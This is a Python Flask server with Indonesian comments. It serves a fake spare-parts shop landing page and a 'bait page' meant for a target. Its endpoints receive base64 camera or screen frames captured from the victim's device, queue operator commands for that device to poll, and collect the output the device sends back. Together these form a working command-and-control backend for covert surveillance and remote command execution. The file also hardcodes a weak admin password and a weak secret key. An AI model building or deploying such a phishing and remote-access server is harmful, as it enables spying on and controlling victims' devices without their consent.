import os
import base64
from flask import Flask, render_template, request, jsonify, session, redirect, url_for

app = Flask(__name__)
# Kunci rahasia untuk mengamankan sesi login operator
app.secret_key = "GEAR99_LAB_EXCLUSIVE_SECRET_KEY"

# Kredensial Login Administrator Panel Operator
USERNAME_ADMIN = "admin"
PASSWORD_ADMIN = "medusa123"

# State data global untuk menampung aliran data nirkabel
latest_frame = None
pending_commands = []
latest_output = ""

# --- 1. RUTE NAVIGASI HALAMAN (ROUTING) ---

@app.route('/')
def index():
    # Menampilkan Landing Page Utama Toko Sparepart Gear99
    return render_template('landing.html')

@app.route('/konfirmasi-paket')
def target_page():
    # Menampilkan Halaman Pancingan Target Otomatisasi
    return render_template('target.html')

@app.route('/operator')
def operator():
    # Memeriksa apakah operator sudah login atau belum
    if not session.get("logged_in"):
        return render_template('login.html')
    return render_template('operator.html')

@app.route('/login', methods=['POST'])
def login():
    if request.form.get("user") == USERNAME_ADMIN and request.form.get("pass") == PASSWORD_ADMIN:
        session["logged_in"] = True
        return redirect(url_for("operator"))
    return "Otorisasi Gagal. <a href='/operator'>Coba Lagi</a>"

@app.route('/logout')
def logout():
    session.pop("logged_in", None)
    return redirect(url_for("operator"))
# --- 2. ENDPOINT API UNTUK ALIRAN DATA MEDIA & PERINTAH ---

@app.route('/receive_frame', methods=['POST'])
def receive_frame():
    global latest_frame
    data = request.json
    if data and 'frame' in data:
        # Menyimpan string data gambar JPEG base64 dari perangkat target
        latest_frame = data['frame']
    return jsonify({"status": "success"})

@app.route('/get_frame')
def get_frame():
    global latest_frame
    if latest_frame:
        try:
            # Memotong header 'data:image/jpeg;base64,' untuk mengambil data mentah
            header, encoded = latest_frame.split(",", 1)
            image_data = base64.b64decode(encoded)
            return image_data, 200, {'Content-Type': 'image/jpeg'}
        except Exception:
            return "", 204
    return "", 204

@app.route('/send_command', methods=['POST'])
def send_command():
    global pending_commands
    data = request.json
    if data and 'command' in data:
        # Memasukkan perintah administratif dari operator ke dalam antrean
        pending_commands.append(data['command'])
    return jsonify({"status": "queued"})

@app.route('/poll_command')
def poll_command():
    global pending_commands
    if pending_commands:
        # Mengambil perintah pertama dari antrean untuk dikirim ke perangkat target
        return jsonify({"command": pending_commands.pop(0)})
    return jsonify({"command": None})

@app.route('/report_output', methods=['POST'])
def report_output():
    global latest_output
    data = request.json
    if data and 'output' in data:
        # Menyimpan laporan riwayat utilitas yang dikirim kembali oleh perangkat target
        latest_output = data['output']
    return jsonify({"status": "reported"})

@app.route('/get_latest_output')
def get_latest_output():
    global latest_output
    # Mengirimkan riwayat aktivitas terbaru ke dasbor operator PC
    return jsonify({"output": latest_output})

if __name__ == '__main__':
    # Server internal berjalan standar di port 80
    app.run(host='0.0.0.0', port=80)
